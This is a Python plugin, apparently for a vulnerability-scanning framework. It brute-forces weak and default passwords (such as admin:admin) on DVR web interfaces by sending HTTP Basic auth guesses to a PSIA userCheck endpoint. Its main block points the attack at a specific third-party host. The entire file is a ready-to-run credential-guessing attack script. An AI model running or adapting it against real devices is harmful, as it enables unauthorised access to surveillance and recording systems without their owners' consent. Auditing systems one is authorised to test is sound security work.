#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'

import urlparse
def assign(service, arg):
    if service == "DVRDVS-Webs":
        return True, arg

def audit(arg):
    import base64
    r = urlparse.urlparse(arg)
    host = r.hostname
    url = arg + "PSIA/Custom/SelfExt/userCheck"
    pass_list = util.load_password_dict(
        host, 
        passfile='database/http_pass.txt',
        userlist=['admin:admin','admin','admin:admin1'],
        mix=False
    )

    for user,pwd in pass_list:
        basic = base64.b64encode(user + ":" + pwd)
        payload = url + " -H Authorization:' Basic '" + basic
        code, head, res, errcode,finalurl =  curl.curl(payload) #采用基本认证
        if code == 404:
            return

        if res.find('OK') != -1 and res.find('200') != -1:
            security_hole('Find Weake password:'+user+" "+pwd +" url:"+url)
            return

if __name__ == '__main__':
    from dummy import *
    audit(assign('DVRDVS-Webs', 'http://gydwyz.sdedu.net/')[1])
